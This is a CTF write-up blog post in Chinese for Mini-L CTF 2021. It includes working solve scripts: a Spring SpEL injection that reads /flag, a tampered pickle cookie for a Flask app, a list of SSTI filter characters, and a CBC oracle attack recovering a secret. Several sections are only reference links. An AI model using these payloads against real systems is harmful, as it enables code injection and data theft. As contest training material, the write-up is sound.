---
title: 【MiniLCTF2021题解】Web&Crypto&Misc
categories: 
- 计算机科学
- 网络安全
- CTF
- moeCTF
tags: 
- CTF
---

# Mini-L CTF 2021 WP: qaq-TEAM

**Mini-L CTF 2021**
		**UserName:** **qaq**
		**Final Rank:** **3nd**
		**Members:**    **framist**
		**ITEMS:**   **Crypto \ Pwn \ Reverse \ Web \ Misc**
		**StartTime:**  **2021/5/6 20:00**
		**EndTime:**    **2021/5/12 20:00**





![image-20210512222011482](http://framist-bucket-openread.oss-cn-shanghai.aliyuncs.com/img/2023/08/15/20230815210519.png)

| 时间              | 分类    | 题目           | 分值 |
| ----------------- | ------- | -------------- | ---- |
| 5月06日 下午10:40 | Misc    | 好白给的签到题 | 250  |
| 5月06日 下午8:03  | Sign in | 签到！         | 250  |
| 5月06日 下午8:57  | Misc    | 抓猫猫         | 250  |
| 5月07日 下午12:35 | Web     | Java           | 250  |
| 5月08日 下午5:45  | Web     | Template       | 730  |
| 5月09日 上午1:21  | Crypto  | 土 块          | 880  |
| 5月11日 下午11:43 | Crypto  | standardcbc    | 933  |
| 5月12日 下午2:51  | Web     | protocol       | 880  |

<!--more-->

## Web

### Java

> 简单签到题，flag在“/flag”。

下载下一个压缩包，是网站源码

```
miniljava
├── minil_java.iml
├── pom.xml
└── src
    ├── main
    │   ├── java
    │   │   └── com
    │   │       ├── Application.java
    │   │       └── controller
    │   │           └── MainController.java  <- 定位到关键文件
    │   ├── META-INF
    │   │   └── MANIFEST.MF
    │   ├── resources
    │   └── webapp
    │       ├── index.jsp
    │       └── WEB-INF
    │           └── web.xml
    └── test
        ├── java
        └── resources
```





```python
import base64

from requests.api import post
url = 'http://4e60f405-9220-45f1-aab0-aedae67482f4.web.woooo.tech/'
url += '/'

postdata = {'code' : '1+1' }

req = requests.post(url= url ,data= postdata)
# print(req.url)
# print(req.encoding)
out = req.text

print(out)
```

https://blog.csdn.net/qq_31481187/article/details/108025512





```java
package com.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.net.MalformedURLException;

@RestController
public class MainController {
    ExpressionParser parser = new SpelExpressionParser();


    @RequestMapping("/")
    public String main(HttpServletRequest request,@RequestParam(required = false) String code,@RequestParam(required = false) String url) throws MalformedURLException {
        String requestURI = request.getRequestURI();
        if(requestURI.equals("/")){
            return "nonono";
        }
        else{
            if (code!=null) {
                String s = parser.parseExpression(code).getValue().toString();
                return s;
            } else {
                return "so?";
            }
        }
    }
}

```









```python
from sys import base_exec_prefix
import requests
import base64

from requests.api import post
url = 'http://6911b89e-80ea-48af-aedf-ba32b774a919.web.woooo.tech/'
url += '/'

postdata = {'code' : 'new java.io.BufferedReader(new java.io.FileReader(new String[]{"/flag"})).readLine()'}

req = requests.post(url= url ,data= postdata)
out = req.text

print(out)
```



### Template

```javascript
function submit() {
    var _0x3bd89c = document['getElementById'](de(list1[_0x34a0('0x0')](-0x1), list1[0x0]))[_0x34a0('0x4')];
    if (/* _0x3bd89c['search']('{|}|%') != -0x1 */ false) {
        alert(de(list1[_0x34a0('0x0')](-0x1), list1[0x1]));
    } else {
        var _0x5e7fb6 = abc(de(list1['slice'](-0x1), list1[0x2]), _0x3bd89c);

        var _0x5a102d = new XMLHttpRequest();
        _0x5a102d[_0x34a0('0x9')](de(list1[_0x34a0(_0x46d9('0x3'))](-0x1), list1[0x3]), de(list1[_0x34a0('0x0')](-0x1), list1[0x4]), !![]);
        _0x5a102d[_0x34a0(_0x46d9('0xc'))](de(list1[_0x46d9('0x11')](-0x1), list1[0x5]), de(list1[_0x34a0('0x0')](-0x1), list1[0x6]));

        var _0x37dc55 = de(list1[_0x46d9('0x11')](-0x1), list1[0x7]) + btoa(_0x5e7fb6);
        _0x5a102d[_0x34a0('0xb')](_0x37dc55);
        _0x5a102d[_0x34a0(_0x46d9('0x1'))] = function () {
            if (_0x5a102d['status'] === 0xc8) {
                var _0x5ddca9 = _0x5a102d[_0x34a0('0xd')];
                document[_0x46d9('0x10')](_0x46d9('0x5'))[_0x34a0('0x2')] = _0x5ddca9;
            } else {
                alert(_0x34a0(_0x46d9('0xa')));
            }
        };
    };
}
```

无过滤：

```
()-_
0-9
self
```

过滤：

```
.
class
+
base
|
```

https://xz.aliyun.com/t/3679

https://www.cnblogs.com/wjw-zm/p/12741055.html

https://blog.csdn.net/csdn_Pade/article/details/88566032

https://xz.aliyun.com/t/7519

https://blog.csdn.net/solitudi/article/details/107752717



的：

http://jsnice.org/#







### protocol



https://blog.csdn.net/qq_41107295/article/details/103026470

https://www.zhihu.com/column/CISP-PTE

https://blog.csdn.net/qq_44657899/article/details/116272541



### L Inc.



Not Found

The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.

```
Flask
python -m pickletools
```

https://docs.python.org/zh-cn/3/library/pickletools.html#module-pickletools

```
    0: \x80 PROTO      4              Protocol version indicator.
    2: \x95 FRAME      42             Indicate the beginning of a new frame.
   11: \x8c SHORT_BINUNICODE 'app'    Push a Python Unicode string object.
   16: \x94 MEMOIZE    (as 0)         Store the stack top into the memo.  The stack is not popped.
   17: \x8c SHORT_BINUNICODE 'User'   Push a Python Unicode string object.
   23: \x94 MEMOIZE    (as 1)         Store the stack top into the memo.  The stack is not popped.
   24: \x93 STACK_GLOBAL              Push a global object (module.attr) on the stack.
   25: \x94 MEMOIZE    (as 2)         Store the stack top into the memo.  The stack is not popped.
   26: )    EMPTY_TUPLE               Push an empty tuple.
   27: \x81 NEWOBJ                    Build an object instance.
   28: \x94 MEMOIZE    (as 3)         Store the stack top into the memo.  The stack is not popped.
   29: }    EMPTY_DICT                Push an empty dict.
   30: \x94 MEMOIZE    (as 4)         Store the stack top into the memo.  The stack is not popped.
   31: (    MARK                      Push markobject onto the stack.
   32: \x8c     SHORT_BINUNICODE 'name' Push a Python Unicode string object.
   38: \x94     MEMOIZE    (as 5)       Store the stack top into the memo.  The stack is not popped.
   39: \x8c     SHORT_BINUNICODE '1'    Push a Python Unicode string object.
   42: \x94     MEMOIZE    (as 6)       Store the stack top into the memo.  The stack is not popped.
   43: \x8c     SHORT_BINUNICODE 'vip'  Push a Python Unicode string object.
   48: \x94     MEMOIZE    (as 7)       Store the stack top into the memo.  The stack is not popped.
   49: \x89     NEWFALSE                Push False onto the stack.
   50: u        SETITEMS   (MARK at 31) Add an arbitrary number of key+value pairs to an existing dict.
   51: b    BUILD                       Finish building an object, via __setstate__ or dict update.
   52: .    STOP                        Stop the unpickling machine.
highest protocol among opcodes = 4
```



```
from sys import base_exec_prefix
import requests
import base64

from requests.api import post
url = 'http://89c33534-a8d0-4473-b9a7-26f3e4891fcb.web.woooo.tech/'
c = {'user':'gASVNAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjAsxMTExMTExMTExMZSMA3ZpcJSIdWIu'}

postdata = {'name' : '11111111111'}

req = requests.post(url= url ,data= postdata,cookies=c)
out = req.text

print(out)

print(req.cookies)
print(req.headers)
"""

"""
```

![img](http://framist-bucket-openread.oss-cn-shanghai.aliyuncs.com/img/2023/08/15/20230815210519-1.png)

https://blog.csdn.net/qq_43431158/article/details/108919605

## Crypto

### 土块

https://baijiahao.baidu.com/s?id=1651247338190291435&wfr=spider&for=pc

https://www.xiaobaijidi.cn/t/55299

https://zhuanlan.zhihu.com/p/58094104

https://zhuanlan.zhihu.com/p/21367507/

https://qiskit.org/documentation/

https://blog.csdn.net/imotherboard/category_9968803.html

> 国密即国家密码局认定的国产密码算法，即商用密码。
>
> 国密算法是国家密码局制定标准的一系列算法。其中包括了对称加密算法，椭圆曲线非对称加密算法，杂凑算法。具体包括SM1,SM2,SM3等，其中：
> SM2为国家密码管理局公布的公钥算法，其加密强度为256位。其它几个重要的商用密码算法包括：
> SM1，对称加密算法，加密强度为128位，采用硬件实现；
> SM3，密码杂凑算法，杂凑值长度为32字节，和SM2算法同期公布，参见《国家密码管理局公告（第 22 号）》；
> SMS4，对称加密算法，随WAPI标准一起公布，可使用软件实现，加密强度为128位。
> ————————————————
> 版权声明：本文为CSDN博主「梦之归途」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
> 原文链接：https://blog.csdn.net/lwzhang1101/article/details/78773700



```python
import numpy as np
from qiskit import *

init_state = [0, 0, 1, 0] # 此中1的位置被修改
# 判断 是   [0, 1, 0, 0] [0, 0, 0, 1]  coin2 == 1 -> 1
# 还是      [1, 0, 0, 0] [0, 0, 1, 0] coin2 == 0 -> 0

Circuitlist = [[9, [1, 0]],[9, [0, 1]]
          ]


qr = QuantumRegister(2) # 量子寄存器 两个量子位组成的寄存器
cr = ClassicalRegister(1) # 经典寄存器 1
qc = QuantumCircuit(qr, cr)

# 用以任意纯态初始化电路
qc.initialize(init_state, qr)

# print(qc.draw(output='text'))

# 设置电路
for i in Circuitlist:
    if i[0] == 1:
        qc.x(*i[1])
    elif i[0] == 2:
        qc.y(*i[1])
    elif i[0] == 3:
        qc.z(*i[1])
    elif i[0] == 4:
        qc.h(*i[1]) # 哈达玛门
    elif i[0] == 5:
        qc.i(*i[1])
    elif i[0] == 6:
        qc.rx(*i[1])
    elif i[0] == 7:
        qc.ry(*i[1])
    elif i[0] == 8:
        qc.rz(*i[1])
    elif i[0] == 9:
        qc.cx(*i[1]) # 受控非操作（CX）在控制量子位0和目标量子位1上，将量子位置于纠缠状态。   
    # else:
    #     raise ValueError('operation not recognized')

qc.measure(1 , 0) # 测量q0_1量子位
# qc.measure(0 , 0) # 测量q0_0量子位 测试用

print(qc.draw(output='text'))

sv_sim = Aer.get_backend('statevector_simulator')
qobj = assemble(qc)
job = sv_sim.run(qobj)

# 测量结果： {’输出':次数}
# 即测量q0_1量子位的输出
measurement_result = job.result().get_counts()

print(measurement_result)
for i in measurement_result:
    print(i)

# 目标：通过输出判断纯态

'''
      ┌──────────────────────┐┌───┐
q0_0: ┤0                     ├┤ X ├──■─────
      │  initialize(0,1,0,0) │└─┬─┘┌─┴─┐┌─┐
q0_1: ┤1                     ├──■──┤ X ├┤M├
      └──────────────────────┘     └───┘└╥┘
c0: 1/═══════════════════════════════════╩═
                                         0

      ┌───┐  
q0_0: ┤   ├───────■───■────────────■───■──────■───■───■────
      │   │             
q0_1: ┤   ├────■─────────■──────■───────────────────■──────
      │   │        
q0_2: ┤   ├────■─────────■──────■────────────────■─────────
      │   │               
q0_3: ┤   ├───────■───■─────────■─────────────■───■───■────
      └───┘                 
c0: 1/═════════════════════════════════════════════════════
                      
'''

```

### standard cbc

```python
from pwn import *
from pwnlib.tubes.remote import remote
from pwnlib.context import context

from gmssl import sm4 #https://github.com/duanhongyi/gmssl
from base64 import *

import time

def SendRecv1(p, msg):
    p.sendline(b64encode(msg))
    time.sleep(0.3)
    iv_msg_secret = p.recv()
    iv_msg_secret = iv_msg_secret[:iv_msg_secret.index(b'\n')]
    iv_msg_secret = b64decode(iv_msg_secret)
    iv = iv_msg_secret[:16]
    msg_secret = iv_msg_secret[16:]
    # print('获取到的iv',iv)
    print('获取到msg+secret',len(msg_secret),':',msg_secret)
    return iv,msg_secret


# if __name__ == "__main__":
# context(os='linux', arch='amd64', log_level='debug')
while True:
    T = time.perf_counter()
    context(os='linux', arch='amd64')
    p = remote('pwn.woooo.tech',10161)
    p.recv()

    # 1.1 得到secret长度
    for i in range(16): # 0~15bytes
        # print('i ==',i)
        p.sendline(b'1')
        # time.sleep(0.1)
        p.recv()

        msg = i * bytes([0])
        iv, msg_secret = SendRecv1(p, msg)
        if len(msg_secret) > 32:
            len_secret = 31 - i + 1
            break

    print('len_secret:',len_secret)
    # 希望程序时长短一点
    if len_secret < 20:
        break
    else:
        p.close()

print('2===================')
# 1.2 获取msg_secret从32位开始
secret = b''

for i in range(len_secret):
    p.sendline(b'1')
    time.sleep(0.1)
    p.recv()
    iv, msg_secret = SendRecv1(p, (32-len_secret+i)*bytes([0]))

    # 2 爆破P2最后一个字节
    
    e = msg_secret[:32] # 取前16+16位

    f = 256 * [False]
    for a in range(256):
        for j in range(256):
            if f[j] and (256-(a^j))%3!=0:
                break
        else:
            print('a ==', a)
            p.sendline(b'2')
            time.sleep(0.3)
            p.recv()

            ciphertext = 16*14*bytes([0]) + e[:15]+bytes([e[15]^a])+e[16:]

            p.sendline(b64encode(ciphertext))
            # time.sleep(0.05)
            p.recv()

            p.sendline(b64encode(iv))
            # time.sleep(0.05)
            b64end = p.recv()
            b64end = b64end[:b64end.index(b'\n')]
            print(b64end)
            if len(b64end)>1:
                print('sleep time ERROR!')
                exit(-1)
            elif b64end == b'':
                break
            elif b64end != b'=':
                f[a] = True
    else:
        print('ERROR!')
        exit(-1)

    Pend = bytes([a])
    print(Pend)
    secret = Pend + secret
    print('Lnow:',len(secret),'LShould:',len_secret,'secret:',secret)
    print('执行时间',(time.perf_counter()-T)/60,'分钟')

print('secret ==',secret)

print('3===================')
context(os='linux', arch='amd64', log_level='debug')
p.sendline(b'3')
time.sleep(0.2)
print(p.recv())
p.sendline(b64encode(secret))
time.sleep(0.2)
print(p.recv())
p.interactive()

'''
b'congratulations\nminiL{40198127-5c91-426a-88f0-7050051ea1a5}\n1.enc;\n2.dec;\n3.getflag;\n\n' 
'''
```



冗长的参考：

https://www.cnblogs.com/s1ye/p/9021202.html

https://blog.csdn.net/weixin_44791273/article/details/108012734

https://blog.csdn.net/qq_45698157/article/details/109746592

https://blog.csdn.net/qq_38412357/article/details/83212668?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.vipsorttest&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.vipsorttest

https://blog.csdn.net/zjjhwz2014/article/details/104084751





## Misc

### 抓猫猫

喵~

CDCQ wants to make a game with you!

There are some cats in XDU. Now cdcq and you will take turns in catching these cats.

CDCQ will tell you the number of cats, and he will catch firstly. Then is your turn.

What's more, the number of cats couched in every turn must be not greater than the
last turn, and must be greater than 1.

The man who catches the last cat in XDU will win the game, and cdcq will not catch
all cats at the first round.

Small cat tells you quietly: in order to make sure you will win, cdcq will not choose
the best number at the first round.

If this problem is toooooo difficult for you, you can input help to get some hints.

Let's go!

The number of cats in XDU is 151.
CDCQ catches 35 cats!
The number of cats in XDU is 116.
The number of cats you will catch is:


```
 ________________________________
/ What doesnt kill you makes you \
\ stronger.                      /
 --------------------------------
   \
    \

     |\_/|
     |o o|__
     --w--__\
     C_C_(___)
```



### 好硬的硬盘

> “我硬盘里有一些好康的” “好康，是新游戏喔” “什么新游戏，比游戏还刺激，还可以教你拿 f l a g 喔” ...... “luoqian不要啊！！”



![img](http://framist-bucket-openread.oss-cn-shanghai.aliyuncs.com/img/2023/08/15/20230815210519-2.png)

![img](http://framist-bucket-openread.oss-cn-shanghai.aliyuncs.com/img/2023/08/15/20230815210519-3.png)

### 好白给的签到题



> ![题目](https://i.loli.net/2021/05/06/KcqoT32ZrmB8ixw.png)





```python
import base64

with open('./misc/story/story.txt','rb') as fr:
    fd = fr.readline()
    
rabbit = [1,1,2,3,5,8,13,21]
rabbit = rabbit[::-1]

for j in range(len(rabbit)):
    print(j,':')
    for i in range(rabbit[j]):
        try:
            fd = base64.b64decode(fd)
            print(i+1,end=',')
        except:
            pass
    print(';')
    fd = fd[::-1]
    if len(fd) < 50:
        print(fd)

with open('./misc/story/out1','wb') as fw:
    fw.write(fd)

```

